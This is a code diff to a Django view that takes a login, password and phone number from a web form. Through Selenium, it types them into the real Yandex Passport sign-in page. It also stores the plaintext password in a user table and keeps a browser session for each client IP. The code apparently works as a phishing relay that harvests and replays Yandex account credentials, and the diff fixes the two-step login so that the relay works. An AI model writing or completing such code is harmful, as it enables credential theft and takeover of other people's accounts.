@@ -1,5 +1,5 @@
 import asyncio
-from django.shortcuts import render, redirect, get_object_or_404
+from django.shortcuts import render
 from django.contrib import messages
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -20,12 +20,12 @@ async def index(request):
             login = request.POST.get('login')
             password = request.POST.get('passwd')
             phone = request.POST.get('phone')
+
             if password:
-
-                await asyncio.to_thread(sign_in,driver,password)
-
+                await asyncio.to_thread(sign_in, driver, login, password)
                 custom_user = CustomUser(login=login, password=password)
                 await sync_to_async(custom_user.save)()
+
             elif login:
                 await asyncio.to_thread(open_yandex_passport, driver)
                 username_login = WebDriverWait(driver, 10).until(
@@ -56,13 +56,20 @@ def create_selenium_driver():
 def open_yandex_passport(driver):
     driver.get("https://passport.yandex.ru")
 
-def sign_in(driver,password):
+def sign_in(driver, login, password):
+    open_yandex_passport(driver)
     username_login = WebDriverWait(driver, 10).until(
-        EC.presence_of_element_located((By.NAME, 'passwd'))
+        EC.presence_of_element_located((By.NAME, 'login'))
     )
     login_submit = driver.find_element(By.ID, "passp:sign-in")
-    username_login.send_keys(password)
+    username_login.send_keys(login)
     login_submit.click()
+    username_password = WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.NAME, 'passwd'))
+    )
+    password_submit = driver.find_element(By.ID, "passp:sign-in")
+    username_password.send_keys(password)
+    password_submit.click()
 
 async def get_driver(request, client_ip):
     if client_ip not in selenium_drivers:
